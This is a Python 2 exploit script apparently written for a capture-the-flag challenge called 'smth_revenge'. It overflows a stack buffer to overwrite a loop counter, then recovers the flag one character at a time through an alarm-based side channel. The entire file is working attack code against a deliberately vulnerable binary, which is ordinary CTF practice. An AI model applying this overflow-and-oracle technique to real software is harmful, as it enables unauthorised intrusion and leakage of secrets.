#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from subprocess import Popen, PIPE
from struct import pack
import signal

class Process:
    def __init__(self, argv):
        self.p = Popen(argv, stdin=PIPE, stdout=PIPE)
    def send(self, data):
        self.p.stdin.write(data)
    def recv(self, n):
        return self.p.stdout.read(n)
    def recvuntil(self, delim):
        data = ''
        while not data.endswith(delim):
            data += self.recv(1)
        return data
    def sendline(self, data):
        self.send(data + '\n')
    def terminate(self):
        self.p.terminate()

def p64(n):
    return pack('<Q', n)

def raise_exception(sig):
    raise Exception

to_saved_rbp = 0x140 - 0xa0
flag_length = 0x80

def main():
    signal.signal(signal.SIGALRM, raise_exception)
    tube = Process(['./smth_revenge'])
    print('retry once')
    tube.recvuntil('): ')
    tube.send('\n')
    print('overwrite the loop counter')
    tube.recvuntil('): ')
    loop_counter = p64(0xf0000000f0000000)
    tube.sendline('A' * (to_saved_rbp-8) + loop_counter)
    print('try candidates')
    flag = 'CBCTF{' + '\xff' * (flag_length - len('CBCTF{')) + '%c\xfe%c'
    for i in range(len('CBCTF{')+1, flag_length):
        for char in range(0x20, 0x7f):
            if chr(char) == '%':
                continue
            flag = flag[:i-1] + chr(char) + flag[i:]
            tube.recvuntil('): ')
            tube.sendline(flag) # send flag
            signal.alarm(1) # set alarm
            try:
                tube.recvuntil('\xfe')
            except Exception: # correct flag
                break
            signal.alarm(0) # turn off alarm
            data = tube.recv(1) # read the first wrong char from beginning
            if data == '\xff': # correct char
                break
        if chr(char) == '}': # end of the flag
            break
    print(flag[:i])
    tube.terminate() # Don't forget to kill the process

# execute this on the remote server
if __name__ == '__main__':
    main()
